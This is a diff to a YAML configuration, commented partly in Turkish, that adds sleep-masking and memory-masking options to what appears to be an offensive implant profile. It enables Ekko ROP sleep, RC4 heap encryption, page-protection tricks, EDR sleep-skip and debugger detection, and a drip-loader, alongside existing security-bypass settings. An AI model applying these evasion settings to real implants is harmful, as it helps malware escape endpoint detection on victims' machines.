@@ -103,7 +103,37 @@ security_bypass:
     check_hooks_first: true
     use_knowndlls: false        # Map from disk, not KnownDlls
 
-# Sleep Obfuscation - MAXIMUM
+# Sleepmask & Runtime Masking - DEFAULT FOR PARANOID
+sleepmask:
+  enabled: true                 # Paranoid profil için default
+  technique: "ekko"             # ROP-based sleep (Cobalt Strike tarzı)
+  fallback_technique: "death_sleep"
+  masking_mode: "rc4"           # XOR, RC4, ChaCha20
+  
+  # Memory masking
+  encrypt_heap: true            # Heap'i de şifrele
+  encrypt_stack: false          # Stack riskli
+  clear_rop_gadgets: true       # ROP chain temizle
+  set_noaccess: true            # Sleep'te PAGE_NOACCESS
+  use_page_guard: true          # PAGE_GUARD ekle
+  
+  # Sleep parameters
+  min_sleep_ms: 5000
+  max_sleep_ms: 30000
+  jitter_percent: 0.50          # 50% jitter
+  
+  # Sleep skip detection (AI guidance)
+  check_sleep_skip: true        # EDR sleep skip tespit
+  fake_sleep_ratio: 0.1         # %10 fake sleep
+  detect_debugger: true
+  
+  # Drip-loader
+  drip_loader:
+    enabled: true               # Yavaş memory yükleme
+    chunk_size: 4096
+    delay_ms: 100
+
+# Legacy sleep config (backward compat)
 sleep_config:
   enabled: true
   technique: "death_sleep"      # Most advanced - thread pool wait
